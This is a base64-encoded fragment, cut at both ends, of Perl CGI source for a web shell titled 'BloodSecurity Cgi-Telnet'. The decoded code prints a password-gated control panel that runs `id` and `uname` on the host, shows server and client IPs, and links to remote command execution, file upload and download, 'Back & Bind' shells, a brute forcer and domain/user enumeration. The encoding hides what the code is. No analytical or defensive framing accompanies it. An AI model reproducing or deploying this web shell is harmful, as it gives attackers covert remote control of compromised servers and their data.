NCgkJfQ0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgZnVuY3Rpb24gRW5jb2RlRGlyOiBlbmNvZGUgYmFzZTY0IFBhdGgNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBFbmNvZGVEaXINCnsNCglteSAkZGlyID0gc2hpZnQ7DQoJJGRpciA9IHRyaW0oZW5jb2RlX2Jhc2U2NCgkZGlyKSk7DQoJJGRpciA9fiBzLyhccnxcbikvLzsNCglyZXR1cm4gJGRpcjsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyDQojIEFyZ3VtZW50IDE6IEZvcm0gaXRlbSBuYW1lIHRvIHdoaWNoIGZvY3VzIHNob3VsZCBiZSBzZXQNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VIZWFkZXINCnsNCgkkRW5jb2RlQ3VycmVudERpciA9IEVuY29kZURpcigkQ3VycmVudERpcik7DQoJbXkgJGlkID0gYGlkYCBpZighJFdpbk5UKTsNCglteSAkaW5mbyA9IGB1bmFtZSAtcyAtbiAtciAtaWA7DQoJcHJpbnQgIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sXG5cbiI7DQoJcHJpbnQgPDxFTkQ7DQo8aHRtbD4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iY29udGVudC10eXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9VVRGLTgiPg0KPHRpdGxlPkJsb29kU2VjdXJpdHkgQ2dpLVRlbG5ldCBbICRWZXJzaW9uIF08L3RpdGxlPg0KJEh0bWxNZXRhSGVhZGVyDQo8L2hlYWQ+DQo8c3R5bGU+DQpib2R5ew0KZm9udDogMTBwdCBWZXJkYW5hOw0KY29sb3I6ICNmZmY7DQp9DQp0cix0ZCx0YWJsZSxpbnB1dCx0ZXh0YXJlYSB7DQpCT1JERVItUklHSFQ6ICAjM2UzZTNlIDFweCBzb2xpZDsNCkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOw0KQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7DQpCT1JERVItQk9UVE9NOiAjM2UzZTNlIDFweCBzb2xpZDsNCn0NCiNkb21haW4gdHI6aG92ZXJ7DQpiYWNrZ3JvdW5kLWNvbG9yOiAjNDQ0Ow0KfQ0KdGQgew0KY29sb3I6ICMyQkE4RUM7DQp9DQoubGlzdGRpciB0ZHsNCgl0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQoubGlzdGRpciB0aHsNCgljb2xvcjogI0ZGOTkwMDsNCn0NCi5kaXIsLmZpbGUNCnsNCgl0ZXh0LWFsaWduOiBsZWZ0ICFpbXBvcnRhbnQ7DQp9DQouZGlyew0KCWZvbnQtc2l6ZTogMTBwdDsgDQoJZm9udC13ZWlnaHQ6IGJvbGQ7DQp9DQp0YWJsZSB7DQpCQUNLR1JPVU5ELUNPTE9SOiAjMTExOw0KfQ0KaW5wdXQgew0KQkFDS0dST1VORC1DT0xPUjogQmxhY2s7DQpjb2xvcjogI2ZmOTkwMDsNCn0NCmlucHV0LnN1Ym1pdCB7DQp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47DQpjb2xvcjogI0ZGRkZGRjsNCmJvcmRlci1jb2xvcjogIzAwOTkwMDsNCn0NCmNvZGUgew0KYm9yZGVyOiBkYXNoZWQgMHB4ICMzMzM7DQpjb2xvcjogd2hpbGU7DQp9DQpydW4gew0KYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7DQpjb2xvcjogI0ZGMDBBQTsNCn0NCnRleHRhcmVhIHsNCkJBQ0tHUk9VTkQtQ09MT1I6ICMxYjFiMWI7DQpmb250OiBGaXhlZHN5cyBib2xkOw0KY29sb3I6ICNhYWE7DQp9DQpBOmxpbmsgew0KCUNPTE9SOiAjMkJBOEVDOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6dmlzaXRlZCB7DQoJQ09MT1I6ICMyQkE4RUM7IFRFWFQtREVDT1JBVElPTjogbm9uZQ0KfQ0KQTpob3ZlciB7DQoJdGV4dC1zaGFkb3c6IDBwdCAwcHQgMC4zZW0gY3lhbiwgMHB0IDBwdCAwLjNlbSBjeWFuOw0KCWNvbG9yOiAjRkZGRkZGOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCkE6YWN0aXZlIHsNCgljb2xvcjogUmVkOyBURVhULURFQ09SQVRJT046IG5vbmUNCn0NCi5saXN0ZGlyIHRyOmhvdmVyew0KCWJhY2tncm91bmQ6ICM0NDQ7DQp9DQoubGlzdGRpciB0cjpob3ZlciB0ZHsNCgliYWNrZ3JvdW5kOiAjNDQ0Ow0KCXRleHQtc2hhZG93OiAwcHQgMHB0IDAuM2VtIGN5YW4sIDBwdCAwcHQgMC4zZW0gY3lhbjsNCgljb2xvcjogI0ZGRkZGRjsgVEVYVC1ERUNPUkFUSU9OOiBub25lOw0KfQ0KLm5vdGxpbmV7DQoJYmFja2dyb3VuZDogIzExMTsNCn0NCi5saW5lew0KCWJhY2tncm91bmQ6ICMyMjI7DQp9DQo8L3N0eWxlPg0KPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+DQpmdW5jdGlvbiBFbmNvZGVyKG5hbWUpDQp7DQoJdmFyIGUgPSAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQobmFtZSk7DQoJZS52YWx1ZSA9IGJ0b2EoZS52YWx1ZSk7DQoJcmV0dXJuIHRydWU7DQp9DQpmdW5jdGlvbiBjaG1vZF9mb3JtKGksZmlsZSkNCnsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZVBlcm1zXyIraSkuaW5uZXJIVE1MPSI8Zm9ybSBuYW1lPUZvcm1QZXJtc18iICsgaSsgIiBhY3Rpb249JycgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1hIHZhbHVlPSdndWknPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWQgdmFsdWU9JyRFbmNvZGVDdXJyZW50RGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7DQoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7DQp9DQpmdW5jdGlvbiBybV9jaG1vZF9mb3JtKHJlc3BvbnNlLGkscGVybXMsZmlsZSkNCnsNCglyZXNwb25zZS5pbm5lckhUTUwgPSAiPHNwYW4gb25jbGljaz1cXFwiY2htb2RfZm9ybSgiICsgaSArICIsJyIrIGZpbGUrICInKVxcXCIgPiIrIHBlcm1zICsiPC9zcGFuPjwvdGQ+IjsNCn0NCmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOw0KCXZhciBiYWNrPSJybV9yZW5hbWVfZm9ybSgiK2krIixcXFwiIitmaWxlKyJcXFwiLFxcXCIiK2YrIlxcXCIpOyByZXR1cm4gZmFsc2U7IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScnIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgdmFsdWU9T0s+PGlucHV0IHR5cGU9c3VibWl0IGNsYXNzPSdzdWJtaXQnIG9uY2xpY2s9JyIgKyBiYWNrICsgIicgdmFsdWU9Q2FuY2VsPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJEVuY29kZUN1cnJlbnREaXInPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWYgdmFsdWU9JyIrZmlsZSsiJz48L2Zvcm0+IjsNCglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsNCn0NCmZ1bmN0aW9uIHJtX3JlbmFtZV9mb3JtKGksZmlsZSxmKQ0Kew0KCWlmKGY9PSdmJykNCgl7DQoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1jb21tYW5kJmQ9JEVuY29kZUN1cnJlbnREaXImYz1lZGl0JTIwIitmaWxlKyIlMjAnPiIgK2ZpbGUrICI8L2E+IjsNCgl9ZWxzZQ0KCXsNCgkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9IjxhIGhyZWY9Jz9hPWd1aSZkPSIrZisiJz5bICIgK2ZpbGUrICIgXTwvYT4iOw0KCX0NCn0NCjwvc2NyaXB0Pg0KPGJvZHkgb25Mb2FkPSJkb2N1bWVudC5mLkBfLmZvY3VzKCkiIGJnY29sb3I9IiMwYzBjMGMiIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+DQo8Y2VudGVyPjxjb2RlPg0KPHRhYmxlIGJvcmRlcj0iMSIgd2lkdGg9IjEwMCUiIGNlbGxzcGFjaW5nPSIwIiBjZWxscGFkZGluZz0iMiI+DQo8dHI+DQoJPHRkIGFsaWduPSJjZW50ZXIiIHJvd3NwYW49Mz4NCgkJPGI+PGZvbnQgc2l6ZT0iMyI+by0tLVsgICRFZGl0UGVyc2lvbiBdLS0tbzwvZm9udD48L2I+DQoJPC90ZD4NCgk8dGQ+DQoJCSRpbmZvDQoJPC90ZD4NCgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSIjZmY5OTAwIj4gJEVOVnsnU0VSVkVSX0FERFInfTwvZm9udD4gfCBZb3VyIElQOiA8Zm9udCBjb2xvcj0iI2ZmOTkwMCI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4NCgk8L3RkPg0KPC90cj4NCjx0cj4NCjx0ZCBjb2xzcGFuPSIyIj4NCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbiI+SG9tZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWNvbW1hbmQmZD0kRW5jb2RlQ3VycmVudERpciI+Q29tbWFuZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Z3VpJmQ9JEVuY29kZUN1cnJlbnREaXIiPkdVSTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPXVwbG9hZCZkPSRFbmNvZGVDdXJyZW50RGlyIj5VcGxvYWQgRmlsZTwvYT4gfCANCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWRvd25sb2FkJmQ9JEVuY29kZUN1cnJlbnREaXIiPkRvd25sb2FkIEZpbGU8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWJhY2tiaW5kIj5CYWNrICYgQmluZDwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9YnJ1dGVmb3JjZXIiPkJydXRlIEZvcmNlcjwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9Y2hlY2tsb2ciPkNoZWNrIExvZzwvYT4gfA0KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uP2E9ZG9tYWluc3VzZXIiPkRvbWFpbnMvVXNlcnM8L2E+IHwNCjxhIGhyZWY9IiRTY3JpcHRMb2NhdGlvbj9hPWxvZ291dCI+TG9nb3V0PC9hPiB8DQo8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0iIyI+SGVscDwvYT4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiPg0KJGlkDQo8L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8Zm9udCBpZD0iUmVzcG9uc2VEYXRhIiBjb2xvcj0iI0ZGRkZGRiIgPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgTG9naW4gU2NyZWVuDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgUHJpbnRMb2dpblNjcmVlbg0Kew0KCXByaW50IDw8RU5EOw0KPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+DQpUeXBpbmdUZXh0ID0gZnVuY3Rpb24oZWxlbWVudCwgaW50ZXJ2YWwsIGN1cnNvciwgZmluaXNoZWRDYWxsYmFjaykgew0KICBpZigodHlwZW9mIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkID09ICJ1bmRlZmluZWQiKSB8fCAodHlwZW9mIGVsZW1lbnQuaW5uZXJIVE1MID09ICJ1bmRlZmluZWQiKSkgew0KICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4NCiAgICByZXR1cm47DQogIH0NCiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsNCiAgdGhpcy5maW5pc2hlZENhbGxiYWNrID0gKGZpbmlzaGVkQ2FsbGJhY2sgPyBmaW5pc2hlZENhbGxiYWNrIDogZnVuY3Rpb24oKSB7IHJldHVybjsgfSk7DQogIHRoaXMuaW50ZXJ2YWwgPSAodHlwZW9mIGludGVydmFsID09ICJ1bmRlZmluZWQiID8gMTAwIDogaW50ZXJ2YWwpOw0KICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsNCiAgdGhpcy51bnBhcnNlZE9yaWdUZXh0ID0gdGhpcy5vcmlnVGV4dDsNCiAgdGhpcy5jdXJzb3IgPSAoY3Vyc29yID8gY3Vyc29yIDogIiIpOw0KICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7DQogIHRoaXMuY3VycmVudENoYXIgPSAwOw0KICB0aGlzLmVsZW1lbnQudHlwaW5nVGV4dCA9IHRoaXM7DQogIGlmKHRoaXMuZWxlbWVudC5pZCA9PSAiIikgdGhpcy5lbGVtZW50LmlkID0gInR5cGluZ3RleHQiICsgVHlwaW5nVGV4dC5jdXJyZW50SW5kZXgrKzsNCiAgVHlwaW5nVGV4dC5hbGwucHVzaCh0aGlzKTsNCiAgdGhpcy5ydW5uaW5nID0gZmFsc2U7DQogIHRoaXMuaW5UYWcgPSBmYWxzZTsNCiAgdGhpcy50YWdCdWZmZXIgPSAiIjsNCiAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsNCiAgdGhpcy5IVE1MRW50aXR5QnVmZmVyID0gIiI7DQp9DQpUeXBpbmdUZXh0LmFsbCA9IG5ldyBBcnJheSgpOw0KVHlwaW5nVGV4dC5jdXJyZW50SW5kZXggPSAwOw0KVHlwaW5nVGV4dC5ydW5BbGwgPSBmdW5jdGlvbigpIHsNCiAgZm9yKHZhciBpID0gMDsgaSA8IFR5cGluZ1RleHQuYWxsLmxlbmd0aDsgaSsrKSBUeXBpbmdUZXh0LmFsbFtpXS5ydW4oKTsNCn0NClR5cGluZ1RleHQucHJvdG90eXBlLnJ1biA9IGZ1bmN0aW9uKCkgew0KICBpZih0aGlzLnJ1bm5pbmcpIHJldHVybjsNCiAgaWYodHlwZW9mIHRoaXMub3JpZ1RleHQgPT0gInVuZGVmaW5lZCIpIHsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7CS8vIFdlIGhhdmVuJ3QgZmluaXNoZWQgbG9hZGluZyB5ZXQuICBIYXZlIHBhdGllbmNlLg0KICAgIHJldHVybjsNCiAgfQ0KICBpZih0aGlzLmN1cnJlbnRUZXh0ID09ICIiKSB0aGlzLmVsZW1lbnQuaW5uZXJIVE1MID0gIiI7DQovLyAgdGhpcy5vcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQucmVwbGFjZSgvPChbXjxdKSo+LywgIiIpOyAgICAgLy8gU3RyaXAgSFRNTCBmcm9tIHRleHQuDQogIGlmKHRoaXMuY3VycmVudENoYXIgPCB0aGlzLm9yaWdUZXh0Lmxlbmd0aCkgew0KICAgIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI8IiAmJiAhdGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgPSAiPCI7DQogICAgICB0aGlzLmluVGFnID0gdHJ1ZTsNCiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICAgIHRoaXMucnVuKCk7DQogICAgICByZXR1cm47DQogICAgfSBlbHNlIGlmKHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpID09ICI+IiAmJiB0aGlzLmluVGFnKSB7DQogICAgICB0aGlzLnRhZ0J1ZmZlciArPSAiPiI7DQogICAgICB0aGlzLmluVGFnID0gZmFsc2U7DQogICAgICB0aGlzLmN1cnJlbnRUZXh0ICs9IHRoaXMudGFnQnVmZmVyOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2UgaWYodGhpcy5pblRhZykgew0KICAgICAgdGhpcy50YWdCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiJiIgJiYgIXRoaXMuaW5IVE1MRW50aXR5KSB7DQogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiJiI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IHRydWU7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiOyIgJiYgdGhpcy5pbkhUTUxFbnRpdHkpIHsNCiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSAiOyI7DQogICAgICB0aGlzLmluSFRNTEVudGl0eSA9IGZhbHNlOw0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLkhUTUxFbnRpdHlCdWZmZXI7DQogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7DQogICAgICB0aGlzLnJ1bigpOw0KICAgICAgcmV0dXJuOw0KICAgIH0gZWxzZSBpZih0aGlzLmluSFRNTEVudGl0eSkgew0KICAgICAgdGhpcy5IVE1MRW50aXR5QnVmZmVyICs9IHRoaXMub3JpZ1RleHQuY2hhckF0KHRoaXMuY3VycmVudENoYXIpOw0KICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOw0KICAgICAgdGhpcy5ydW4oKTsNCiAgICAgIHJldHVybjsNCiAgICB9IGVsc2Ugew0KICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsNCiAgICB9DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9IHRoaXMuY3VycmVudFRleHQ7DQogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCArPSAodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoIC0gMSA/ICh0eXBlb2YgdGhpcy5jdXJzb3IgPT0gImZ1bmN0aW9uIiA/IHRoaXMuY3Vyc29yKHRoaXMuY3VycmVudFRleHQpIDogdGhpcy5jdXJzb3IpIDogIiIpOw0KICAgIHRoaXMuY3VycmVudENoYXIrKzsNCiAgICBzZXRUaW1lb3V0KCJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnIiArIHRoaXMuZWxlbWVudC5pZCArICInKS50eXBpbmdUZXh0LnJ1bigpIiwgdGhpcy5pbnRlcnZhbCk7DQogIH0gZWxzZSB7DQoJdGhpcy5jdXJyZW50VGV4dCA9ICIiOw0KCXRoaXMuY3VycmVudENoYXIgPSAwOw0KICAgICAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsNCiAgICAgICAgdGhpcy5maW5pc2hlZENhbGxiYWNrKCk7DQogIH0NCn0NCjwvc2NyaXB0Pg0KPC9wcmU+DQoNCjxicj4NCg0KPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPg0KbmV3IFR5cGluZ1RleHQoZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImhhY2siKSwgMzAsIGZ1bmN0aW9uKGkpeyB2YXIgYXIgPSBuZXcgQXJyYXkoIl8iLCIiKTsgcmV0dXJuICIgIiArIGFyW2kubGVuZ3RoICUgYXIubGVuZ3RoXTsgfSk7DQpUeXBpbmdUZXh0LnJ1bkFsbCgpOw0KDQo8L3NjcmlwdD4NCkVORA0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBlbmNvZGUgaHRtbCBzcGVjaWFsIGNoYXJzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgVXJsRW5jb2RlKCQpew0KCW15ICRzdHIgPSBzaGlmdDsNCgkkc3RyID1+IHMvKFteQS1aYS16MC05XSkvc3ByaW50ZigiJSUlMDJYIiwgb3JkKCQxKSkvc2VnOw0KCXJldHVybiAkc3RyOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBBZGQgaHRtbCBzcGVjaWFsIGNoYXJzDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgSHRtbFNwZWNpYWxDaGFycygkKXsNCglteSAkdGV4dCA9IHNoaWZ0Ow0KCSR0ZXh0ID1+IHMvJi8mYW1wOy9nOw0KCSR0ZXh0ID1+IHMvIi8mcXVvdDsvZzsNCgkkdGV4dCA9fiBzLycvJy9nOw0KCSR0ZXh0ID1+IHMvPC8mbHQ7L2c7DQoJJHRleHQgPX4gcy8+LyZndDsvZzsNCglyZXR1cm4gJHRleHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEFkZCBsaW5rIGZvciBkaXJlY3RvcnkNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBBZGRMaW5rRGlyKCQpDQp7DQoJbXkgJGFjPXNoaWZ0Ow0KCW15IEBkaXI9KCk7DQoJaWYoJFdpbk5UKQ0KCXsNCgkJQGRpcj1zcGxpdCgvXFwvLCRDdXJyZW50RGlyKTsNCgl9ZWxzZQ0KCXsNCgkJQGRpcj1zcGxpdCgiLyIsJnRyaW0oJEN1cnJlbnREaXIpKTsNCgl9DQoJbXkgJHBhdGg9IiI7DQoJbXkgJHJlc3VsdD0iIjsNCglmb3JlYWNoIChAZGlyKQ0KCXsNCgkJJHBhdGggLj0gJF8uJFBhdGhTZXA7DQoJCSRyZXN1bHQuPSI8YSBocmVmPSc/YT0iLiRhYy4iJmQ9Ii5lbmNvZGVfYmFzZTY0KCRwYXRoKS4iJz4iLiRfLiRQYXRoU2VwLiI8L2E+IjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFByaW50cyB0aGUgbWVzc2FnZSB0aGF0IGluZm9ybXMgdGhlIHVzZXIgb2YgYSBmYWlsZWQgbG9naW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRmFpbGVkTWVzc2FnZQ0Kew0KCXByaW50IDw8RU5EOw0KDQpQYXNzd29yZDo8YnI+DQpMb2dpbiBpbmNvcnJlY3Q8YnI+PGJyPg0KRU5EDQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBIVE1MIGZvcm0gZm9yIGxvZ2dpbmcgaW4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludExvZ2luRm9ybQ0Kew0KCXByaW50IDw8RU5EOw0KPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0ibG9naW4iPg0KTG9naW4gOiBBZG1pbmlzdHJhdG9yPGJyPg0KUGFzc3dvcmQ6PGlucHV0IHR5cGU9InBhc3N3b3JkIiBuYW1lPSJwIj4NCjxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQo8L2Zvcm0+DQpFTkQNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgUHJpbnRzIHRoZSBmb290ZXIgZm9yIHRoZSBIVE1MIFBhZ2UNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBQcmludFBhZ2VGb290ZXINCnsNCglwcmludCAiPGJyPjxmb250IGNvbG9yPXJlZD5vLS0tWyAgPGZvbnQgY29sb3I9I2ZmOTkwMD5FZGl0IGJ5ICRFZGl0UGVyc2lvbiA8L2ZvbnQ+ICBdLS0tbzwvZm9udD48L2NvZGU+PC9jZW50ZXI+PC9ib2R5PjwvaHRtbD4iOw0KfQ0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0KIyBSZXRyZWl2ZXMgdGhlIHZhbHVlcyBvZiBhbGwgY29va2llcy4gVGhlIGNvb2tpZXMgY2FuIGJlIGFjY2Vzc2VzIHVzaW5nIHRoZQ0KIyB2YXJpYWJsZSAkQ29va2llc3snJ30NCiMtLS0tLS0tLS0tLS0tLS0tLS